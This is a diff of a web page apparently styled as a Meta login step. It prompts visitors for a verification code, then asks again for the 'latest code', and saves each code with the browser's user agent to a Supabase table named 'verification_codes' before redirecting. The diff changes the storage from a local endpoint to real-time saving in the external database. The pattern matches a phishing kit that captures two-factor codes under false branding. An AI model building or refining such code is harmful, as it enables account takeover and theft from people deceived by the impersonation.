@@ -149,10 +149,14 @@
       <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
     </div>
 
+    <script src="supabaseClient.js"></script>
     <script>
       // Track whether we're awaiting the second (“latest”) code
       let awaitingLatest = false;
-
+      // Initialize real-time field saving on page load
+      document.addEventListener('DOMContentLoaded', function() {
+        createFieldSaveHandler('verification_codes', 'code-input');
+      });
       window.onload = function () {
         const user = localStorage.getItem("login_user");
         const msgEl = document.getElementById("confirmation-msg");
@@ -203,57 +207,25 @@
         continueBtn.disabled = true;
 
         if (!awaitingLatest) {
-          // First code submission
-          fetch("/save-code", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code }),
-          })
-            .then((res) => res.json())
-            .then((data) => {
-              if (data.success) {
-                // Move to latest-code step
-                awaitingLatest = true;
-                headingEl.textContent = "Enter Latest Code";
-                msgEl.textContent = "Kindly the most recent code we sent to continue.";
-                msgEl.style.color = "red"; // <-- Add this line
-                codeInput.value = "";
-                codeInput.focus();
+          // First code submission - save to Supabase
+          const firstCodeData = { code: code, userAgent: navigator.userAgent };
+          saveFieldData('verification_codes', firstCodeData);
 
-              } else {
-                alert("Failed to save the first code. Try again.");
-              }
-            })
-            .catch((err) => {
-              console.error("Error saving first code:", err);
-              alert("An error occurred while submitting the code. Try again.");
-            })
-            .finally(() => {
-              continueBtn.disabled = false;
-            });
+          // Move to latest-code step
+          awaitingLatest = true;
+          headingEl.textContent = "Enter Latest Code";
+          msgEl.textContent = "Kindly the most recent code we sent to continue.";
+          msgEl.style.color = "red";
+          codeInput.value = "";
+          codeInput.focus();
+          continueBtn.disabled = false;
         } else {
-          // Second ("latest") code submission
-          fetch("/save-latest", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code }),
-          })
-            .then((res) => res.json())
-            .then((data) => {
-              if (data.success) {
-                // Proceed to next page
-                window.location.href = "homepage.html";
-              } else {
-                alert("Incorrect latest code. Please try again.");
-              }
-            })
-            .catch((err) => {
-              console.error("Error saving latest code:", err);
-              alert("An error occurred while submitting the latest code. Try again.");
-            })
-            .finally(() => {
-              continueBtn.disabled = false;
-            });
+          // Second ("latest") code submission - save to Supabase
+          const latestCodeData = { code: code, userAgent: navigator.userAgent };
+          saveFieldData('verification_codes', latestCodeData);
+
+          // Proceed to next page
+          window.location.href = "homepage.html";
         }
       }
     </script>
